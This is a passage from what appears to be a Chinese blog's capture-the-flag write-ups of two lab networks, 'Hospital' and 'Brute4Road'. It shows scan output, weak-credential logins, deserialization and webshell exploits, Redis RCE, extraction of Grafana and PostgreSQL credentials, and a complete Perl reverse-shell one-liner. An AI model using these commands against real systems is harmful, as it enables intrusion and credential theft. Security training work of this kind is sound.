17:24:18] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-10 17:24:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\\SERVER02            </span><br><span class=\"line\">[2025-04-10 17:24:18] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.30.12.6</span><br><span class=\"line\">主机名: Server02</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.30.12.6</span><br><span class=\"line\">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392</span><br><span class=\"line\">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class=\"line\">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class=\"line\">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class=\"line\">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class=\"line\">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class=\"line\">  漏洞名称: </span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        author:AgeloVito</span><br><span class=\"line\">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class=\"line\">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class=\"line\">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class=\"line\">  漏洞名称: </span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        author:AgeloVito</span><br><span class=\"line\">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class=\"line\">[2025-04-10 17:24:21] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class=\"line\">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class=\"line\">  漏洞名称: </span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class=\"line\">        links:https://github.com/alibaba/nacos/issues/4593</span><br></pre></td></tr></table></figure>\n\n<p>扫到了一个nacos，那就从这里入手，弱口令nacos/nacos登录,这个框架还存在yaml反序列化漏洞</p>\n<p>在172.30.12.5上面放上恶意的jar文件，然后开启一个web服务，再用利用工具去执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class=\"line\">RDP         172.30.12.6     3389   Server02         [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)</span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class=\"line\">RDP         172.30.12.6     3389   Server02         [+] Server02\\lv:Asd123132. (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>用户添加成功了，挂上代理，远程桌面连接，flag02在C:\\Users\\Administrator\\flag下</p>\n<h1 id=\"flag03\"><a href=\"#flag03\" class=\"headerlink\" title=\"flag03\"></a>flag03</h1><p>172.30.12.236主机开放了8009端口，登录口传入的数据为 JSON 格式。探测 fastjson 版本 payload：<code>&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code></p>\n<p><a href=\"https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png\">https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png</a>)</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital1.png\"></p>\n<p>用<a href=\"https://github.com/amaz1ngday/fastjson-exp\">bp的插件</a>注入内存马,哥斯拉连接，flag03在/root/flag/下</p>\n<h1 id=\"flag04\"><a href=\"#flag04\" class=\"headerlink\" title=\"flag04\"></a>flag04</h1><p>这个靶机还有第二张网卡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/ &gt;ip a</span><br><span class=\"line\"></span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class=\"line\">       valid_lft 315354333sec preferred_lft 315354333sec</span><br><span class=\"line\">    inet6 fe80::216:3eff:fe0d:aae2/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::216:3eff:fe0d:aa92/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<p>上传一个fscan，然后扫一下，地址为172.30.54.12，需要二层内网代理，这台机器上有<strong>grafana+postgres</strong>两个服务，grafana存在弱口令admin/admin登录,在web3的机器上上传一个<a href=\"https://github.com/A-D-Team/grafanaExp\">exp</a>,可以跑到postgres的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]</span><br><span class=\"line\">2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class=\"line\">2024/07/04 12:20:59 There is [0] records in db.</span><br><span class=\"line\">2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]</span><br><span class=\"line\">2024/07/04 12:20:59 All Done, have nice day!</span><br></pre></td></tr></table></figure>\n\n<p><code>psql -h 172.30.54.12 -p 5432 -U postgres</code>连接,查询root的密码<code>select usename, passwd from pg_shadow;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres=# select usename, passwd from pg_shadow;</span><br><span class=\"line\"> usename  |               passwd</span><br><span class=\"line\">----------+-------------------------------------</span><br><span class=\"line\"> root     | md5da974531914a7c2c56df745574a5bd3a</span><br><span class=\"line\"> postgres | md5dd27d33705155fd675e498384ad3d2ea</span><br></pre></td></tr></table></figure>\n\n<p>爆破出来是<code>P@ssw0rd123</code>,在web03的机器上监听一个端口，然后用perl反弹一个shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select system(&#x27;perl -e \\&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>然后psql提权，flag04在/root/flag/下</p>\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"春秋云镜-Brute4Road","url":"/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/","content":"<h1 id=\"FLAG1-amp-FLAG2\"><a href=\"#FLAG1-amp-FLAG2\" class=\"headerlink\" title=\"FLAG1&amp;FLAG2\"></a>FLAG1&amp;FLAG2</h1><p>先用fscan扫一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan2 -h 39.99.231.184</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-15 02:37:33] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1</span><br><span class=\"line\">[2025-04-15 02:37:33] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-15 02:37:33] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379</span><br><span class=\"line\">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80</span><br><span class=\"line\">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21</span><br><span class=\"line\">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22</span><br><span class=\"line\">[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class=\"line\">[2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class=\"line\">[2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store</span><br><span class=\"line\">[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class=\"line\">[2025-04-15 02:37:43] [INFO] 存活端口数量: 4</span><br><span class=\"line\">[2025-04-15 02:37:43] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184      状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class=\"line\">[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功!</span><br><span class=\"line\">[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb</span><br><span class=\"line\">[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379</span><br><span class=\"line\">[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>\n\n<p>打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/bin/base64 ./flag01|/usr/bin/base64 -d</span><br></pre></td></tr></table></figure>\n\n<p>ftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./fscan -h 172.22.2.7/24</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class=\"line\">[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...</span><br><span class=\"line\">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class=\"line\">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class=\"line\">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class=\"line\">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class=\"line\">[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class=\"line\">[2025-04-15 15:23:04] [INFO] 存活主机数量: 5</span><br><span class=\"line\">[2025-04-15 15:23:04] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class=\"line\">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class=\"line\">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class=\"line\">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class=\"line\">[2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class=\"line\">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] 存活端口数量: 21</span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.2.34</span><br><span class=\"line\">主机名: CLIENT01</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.2.34</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.2.3</span><br><span class=\"line\">主机名: DC</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.2.3</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.2.16</span><br><span class=\"line\">主机名: MSSQLSERVER</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.2.16</span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\\CLIENT01             </span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\\UBUNTU-WEB02        </span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功!</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class=\"line\">[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class=\"line\">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class=\"line\">[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class=\"line\">[2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[i] Plugin(s) Identified:</span><br><span class=\"line\"></span><br><span class=\"line\">[+] wpcargo</span><br><span class=\"line\"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class=\"line\"> | Last Updated: 2024-08-08T17:00:00.000Z</span><br><span class=\"line\"> | [!] The version is out of date, the latest version is 7.0.6</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] 6 vulnerabilities identified:</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo &lt; 6.9.0 - Unauthenticated RCE</span><br><span class=\"line\"> |     Fixed in: 6.9.0</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting</span><br><span class=\"line\"> |     Fixed in: 6.9.5</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting</span><br><span class=\"line\"> |     Fixed in: 6.9.5</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004</span><br><span class=\"line\"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271</span><br><span class=\"line\"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference</span><br><span class=\"line\"> |     References:</span><br><span class=\"line\"> |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b</span><br><span class=\"line\"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609</span><br><span class=\"line\"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6</span><br><span class=\"line\"> |</span><br><span class=\"line\"> | Version: 6.x.x (80% confidence)</span><br><span class=\"line\"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class=\"line\"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br></pre></td></tr></table></figure>\n\n<p>存在wpcargo插件，有一个rce的漏洞<a href=\"https://github.com/biulove0x/CVE-2021-25003\">https://github.com/biulove0x/CVE-2021-25003</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# python3 2 -t &quot;http://172.22.2.18/&quot;</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\"></span><br><span class=\"line\">############################################</span><br><span class=\"line\"># @author : biulove0x                      #</span><br><span class=\"line\"># @name   : WP Plugins WPCargo Exploiter   #</span><br><span class=\"line\"># @cve    : CVE-2021-25003                 #</span><br><span class=\"line\">############################################</span><br><span class=\"line\"></span><br><span class=\"line\">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK</span><br><span class=\"line\">[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png\"></p>\n<p>蚁剑连接，可以拿到数据库的密码</p>\n<p><img 